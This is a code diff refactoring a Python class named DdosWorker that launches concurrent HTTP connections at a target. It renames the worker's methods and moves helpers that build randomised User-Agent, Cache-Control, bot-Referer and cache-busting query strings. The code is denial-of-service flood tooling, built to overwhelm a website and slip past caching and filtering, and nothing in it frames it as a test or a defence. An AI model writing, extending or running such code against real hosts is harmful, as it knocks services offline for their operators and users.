@@ -12,33 +12,20 @@ from src.utils.rand_utlis import rand_user_agent, rand_bot_referer, rand_accept_
 
 class DdosWorker:
     def __init__(self, target: str, ssl=False, debug=False):
-        self.target = target
+        self._target = target
         self._ssl = ssl
         self._debug = debug
 
-    def _get_headers(self):
-        return {
-            'User-Agent': rand_user_agent(),
-            'Cache-Control': rand_cache_type(),
-            'Accept-Encoding': rand_accept_encoding(),
-            'Keep-Alive': '42',
-            'Host': self.target,
-            'Referer': rand_bot_referer()
-        }
-
-    def _create_url(self):
-        return self.target + '?' + rand_str()
-
     def run_concurrent(self, threads_count: int) -> int:
         with ThreadPoolExecutor(threads_count) as executor:
-            results = wait([executor.submit(self.run) for _ in range(threads_count)])
+            results = wait([executor.submit(self._exec_single_connection) for _ in range(threads_count)])
             success_count = reduce(lambda acc, future: acc + int(future.exception() is None), results.done, 0)
         return success_count
 
-    def run(self):
+    def _exec_single_connection(self):
         conn: HTTPConnection | None = None
         try:
-            target_parsed = urlparse(self.target)
+            target_parsed = urlparse(self._target)
             scheme = target_parsed.scheme
             hostname = target_parsed.hostname
             port = target_parsed.port
@@ -66,3 +53,16 @@ class DdosWorker:
         finally:
             if conn is not None:
                 conn.close()
+
+    def _get_headers(self):
+        return {
+            'User-Agent': rand_user_agent(),
+            'Cache-Control': rand_cache_type(),
+            'Accept-Encoding': rand_accept_encoding(),
+            'Keep-Alive': '42',
+            'Host': self._target,
+            'Referer': rand_bot_referer()
+        }
+
+    def _create_url(self):
+        return self._target + '?' + rand_str()
